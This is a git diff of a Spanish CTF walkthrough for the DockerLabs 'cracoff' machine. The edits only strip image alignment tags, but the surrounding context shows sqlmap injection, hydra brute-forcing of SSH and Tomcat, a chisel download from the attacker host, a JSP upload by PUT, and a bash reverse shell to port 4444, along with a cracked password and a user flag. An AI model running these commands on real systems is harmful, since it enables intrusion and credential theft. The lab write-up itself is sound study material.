@@ -175,7 +175,7 @@ sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent
 - `information_schema` / `performance_schema`
 Se guardo el contenido del request capturado en **burpsuite**.
 
-![Request Burpsuite](/assets/images/posts/dockerlabs/cracoff/burp.png){: .align-center}
+![Request Burpsuite](/assets/images/posts/dockerlabs/cracoff/burp.png)
 
 
 Algunos comandos SQLMAP
@@ -284,7 +284,7 @@ El ataque fue exitoso, identificando una credencial válida para el usuario **ro
 [22][ssh] host: 172.17.0.2   login: rosa   password: ultramegaverypasswordhack
 ```
 
-![Acces Rosa](/assets/images/posts/dockerlabs/cracoff/rosa.png){: .align-center}
+![Acces Rosa](/assets/images/posts/dockerlabs/cracoff/rosa.png)  
 
 
 
@@ -314,13 +314,13 @@ El script resaltó varios puntos críticos en el sistema:
 
 Se identificaron posibles vulnerabilidades a nivel de Kernel que podrían permitir el salto directo a root.
 
-![suggest](/assets/images/posts/dockerlabs/cracoff/sugges.png){: .align-center}
+![suggest](/assets/images/posts/dockerlabs/cracoff/sugges.png)  
 
 #### B. Análisis de Configuraciones y Permisos
 
 El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actual y configuraciones de servicios (como Tomcat y Apache) que exponen vectores de movimiento lateral.
 
-![Contenido](/assets/images/posts/dockerlabs/cracoff/php1.png){: .align-center}
+![Contenido](/assets/images/posts/dockerlabs/cracoff/php1.png)  
 
 
 ```bash
@@ -338,7 +338,7 @@ El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actu
 ```
 
 
-![Ps Aux](/assets/images/posts/dockerlabs/cracoff/aux1.png){: .align-center}
+![Ps Aux](/assets/images/posts/dockerlabs/cracoff/aux1.png)  
 
 ```bash
 ╔══════════╣ Searching root files in home dirs (limit 30)                                                
@@ -382,7 +382,7 @@ wget http://<IP_KALI>:9001/chisel
 chmod +x chisel
 ```
 
-![PortForwarding](/assets/images/posts/dockerlabs/cracoff/chisel.png){: .align-center}
+![PortForwarding](/assets/images/posts/dockerlabs/cracoff/chisel.png)  
 
 
 ---
@@ -412,7 +412,7 @@ cd /tmp
 
 Con el acceso habilitado en `http://localhost:8080`, se confirmó la versión del servicio y se procedió a la validación de acceso al panel de gestión.
 
-![Tomcat version](/assets/images/posts/dockerlabs/cracoff/tomcat1.png){: .align-center}
+![Tomcat version](/assets/images/posts/dockerlabs/cracoff/tomcat1.png)  
 
 ### 8.1. Ataque de Fuerza Bruta / Validación
 
@@ -423,7 +423,7 @@ Aunque se contaba con un dump previo de SQLMap, se utilizó **Hydra** para confi
 ```Bash
 hydra -l alice -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get /manager/html
 ```
-![Usuario Tomcat](/assets/images/posts/dockerlabs/cracoff/user1.png){: .align-center}
+![Usuario Tomcat](/assets/images/posts/dockerlabs/cracoff/user1.png)  
 
 **Resultado de Autenticación** El ataque confirmó las credenciales filtradas anteriormente, permitiendo el acceso al **Tomcat Web Application Manager**. Este panel es el vector definitivo para lograr la ejecución remota de código (RCE).
 
@@ -485,7 +485,7 @@ curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
 
 Tras recibir la conexión reversa del archivo `shell.war`, se obtuvo una shell limitada. Para poder utilizar comandos interactivos (como `su`, `nano`, o el autocompletado con Tab), se procedió al tratamiento de la TTY.
 
-![chisel1](/assets/images/posts/dockerlabs/cracoff/burp.png){: .align-center}
+![chisel1](/assets/images/posts/dockerlabs/cracoff/burp.png)  
 
 ### Tratamiento TTY y acceso al sistema
 
@@ -563,7 +563,7 @@ cat user.txt
 
 **User Flag:** `d099be3ff7be7294c9344daadebca767`
 
-![Acceso a Mario](/assets/images/posts/dockerlabs/cracoff/ls.png){: .align-center}
+![Acceso a Mario](/assets/images/posts/dockerlabs/cracoff/ls.png)  
 
 #### Exfiltración de Base de Datos (KeePass)
 
@@ -573,7 +573,7 @@ Se identificó un archivo de base de datos de contraseñas de **KeePass** perten
 
 Se realizó la transferencia del archivo `.kdbx` a la máquina atacante para su posterior análisis _offline_ (Fuerza bruta con `keepass2john` y `john the ripper`).
 
-![KeePass](/assets/images/posts/dockerlabs/cracoff/keepass.png){: .align-center}
+![KeePass](/assets/images/posts/dockerlabs/cracoff/keepass.png)  
 
 ### Acceso al usuario Alice. 
 Se obtuvo acceso mediante SSH utilizando credenciales previamente identificadas.
@@ -655,7 +655,7 @@ echo "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" > /opt/alice/boss
 
 ### Ejecución y Shell Obtenida
 
-![Acceso root](/assets/images/posts/dockerlabs/cracoff/root.png){: .align-center}
+![Acceso root](/assets/images/posts/dockerlabs/cracoff/root.png)
 
 
 
@@ -694,5 +694,6 @@ Para acceder desde tu terminal utilizando la llave privada:
 ```bash
 ssh -i ./id_rsa_root root@127.17.0.2
 ```
+
 
 
